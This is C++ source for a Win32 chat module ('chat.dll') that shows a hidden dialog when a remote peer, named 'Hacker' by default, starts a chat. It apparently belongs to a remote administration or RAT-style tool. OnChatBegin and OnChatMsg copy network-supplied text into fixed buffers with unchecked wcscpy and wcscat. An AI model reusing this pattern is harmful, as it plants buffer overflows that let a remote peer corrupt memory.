#include "Chat.h"
#include "resource.h"
CChat::CChat(DWORD dwIdentity):
CEventHandler(dwIdentity)
{
	m_hInit = NULL;
	m_hDlg = NULL;
	m_hWndThread = NULL;
	m_dwThreadId = 0;
	memset(m_szPeerName, 0, sizeof(m_szPeerName));
}


CChat::~CChat()
{
}

//假设对话框不可能由client关闭,只能由客户端断开.;


BOOL CALLBACK CChat::DlgProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	WCHAR Msg[8192] = { 0 };
	WCHAR buffer[4096];
	HWND hInput;
	HWND hMsgList;
	static CChat*pChat = NULL;
	switch (uMsg)
	{
	case WM_INITDIALOG:
		pChat = NULL;
		pChat = (CChat*)lParam;
		break;
	case WM_CLOSE:		//ignore close msg;
		break;
	case WM_COMMAND:
		switch(LOWORD(wParam))
		{
		case IDOK:
			if(pChat)
			{
				hInput= GetDlgItem(pChat->m_hDlg, ID_INPUT);
				hMsgList = GetDlgItem(pChat->m_hDlg, ID_MSGLIST);
				GetWindowTextW(hInput, buffer, 4095);
				if(wcslen(buffer) == 0)
					break;
				SetWindowTextW(hInput, L"");
				pChat->Send(CHAT_MSG,(char*)buffer,sizeof(WCHAR)*(wcslen(buffer) + 1));

				//把自己发送的内容显示到屏幕上;
				wcscat(Msg, L"[me]:");
				wcscat(Msg, buffer);
				wcscat(Msg, L"\r\n");
				SendMessageW(hMsgList, EM_SETSEL, -1, 0);
				SendMessageW(hMsgList, EM_REPLACESEL, FALSE, (LPARAM)Msg);
			}
			break;
		case IDCANCEL:
			break;
		}
		break;
	default:
		return FALSE;
	}
	return TRUE;
}



void CChat::ThreadProc(CChat*pChat)
{
	HINSTANCE hInstance = GetModuleHandleW(L"chat.dll");
	pChat->m_hDlg = CreateDialogParam(hInstance, MAKEINTRESOURCE(IDD_CHAT_DLG),NULL, DlgProc,(LPARAM)pChat);
	//
	//hide window
	ShowWindow(pChat->m_hDlg, SW_HIDE);
	//enable(false) send button
	HWND hCtrl = GetDlgItem(pChat->m_hDlg, IDOK);
	EnableWindow(hCtrl, FALSE);

	SetEvent(pChat->m_hInit);
	MSG msg = { 0 };

	while (GetMessage(&msg, 0, 0, 0))
	{
		if (!IsDialogMessage(pChat->m_hDlg, &msg))
		{
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
	}
	//退出了.;
	DestroyWindow(pChat->m_hDlg);
	pChat->m_hDlg = NULL;
}

BOOL CChat::ChatInit()
{
	BOOL bResult = FALSE;
	m_hInit = CreateEvent(0, 0, FALSE, NULL);
	if (m_hInit == NULL)
		return FALSE;
	//创建线程;
	m_hWndThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ThreadProc, this, 0, &m_dwThreadId);
	if (m_hWndThread == 0)
	{
		return FALSE;
	}
	//等待线程创建窗口完毕;
	WaitForSingleObject(m_hInit, INFINITE);
	CloseHandle(m_hInit);
	m_hInit = NULL;
	if (m_hDlg == NULL)				//失败.;
		return FALSE;
	//
	return TRUE;
}
void CChat::OnConnect()
{
	DWORD dwStatu = 0;
	if (ChatInit())
	{
		dwStatu = 1;
	}
	Send(CHAT_INIT, (char*)&dwStatu, sizeof(dwStatu));
}
void CChat::OnClose()
{
	//结束了.;
	if (m_dwThreadId)
	{
		//
		PostThreadMessage(m_dwThreadId, WM_QUIT, 0, 0);
		WaitForSingleObject(m_hWndThread,INFINITE);
		CloseHandle(m_hWndThread);

		m_hWndThread = NULL;
		m_dwThreadId = NULL;
	}
	if (m_hDlg)
	{
		DestroyWindow(m_hDlg);
		m_hDlg = NULL;
	}
	if (m_hInit)
	{
		CloseHandle(m_hInit);
		m_hInit = NULL;
	}
}

void CChat::OnChatBegin(DWORD dwRead, char*szBuffer)
{
	if (dwRead == 0 || !szBuffer[0])
	{
		wcscpy(m_szPeerName, L"Hacker");
	}
	else
	{
		wcscpy(m_szPeerName, (WCHAR*)szBuffer);
	}
	if (m_hDlg)
	{
		WCHAR Title[256] = {0};
		wcscpy(Title,L"Chating with ");
		wcscat(Title,m_szPeerName);
		SetWindowTextW(m_hDlg,Title);
		//Show dlg
		ShowWindow(m_hDlg, SW_SHOW);
		//enable (true) send button.
		HWND hCtrl = GetDlgItem(m_hDlg, IDOK);
		EnableWindow(hCtrl, TRUE);
	}
}

void CChat::OnChatMsg(DWORD dwRead, char*szBuffer)
{
	WCHAR Msg[8192] = { 0 };
	//显示到对话框里面;
	if (m_hDlg)
	{
		HWND hCtrl = GetDlgItem(m_hDlg, ID_MSGLIST);
		//末尾追加数据.;
		Msg[0] = '[';
		wcscat(Msg, m_szPeerName);
		wcscat(Msg, L"]:");
		wcscat(Msg, (WCHAR*)szBuffer);
		wcscat(Msg,L"\r\n");
		SendMessageW(hCtrl, EM_SETSEL, -1, 0);
		SendMessageW(hCtrl, EM_REPLACESEL, FALSE, (LPARAM)Msg);
	}
}
void CChat::OnReadComplete(WORD Event, DWORD Total, DWORD Read, char*Buffer)
{
	switch (Event)
	{
	case CHAT_BEGIN:
		OnChatBegin(Read,Buffer);
		break;
	case CHAT_MSG:
		OnChatMsg(Read, Buffer);
		break;
	default:
		break;
	}
}

void CChat::OnReadPartial(WORD Event, DWORD Total, DWORD Read, char*Buffer)
{


}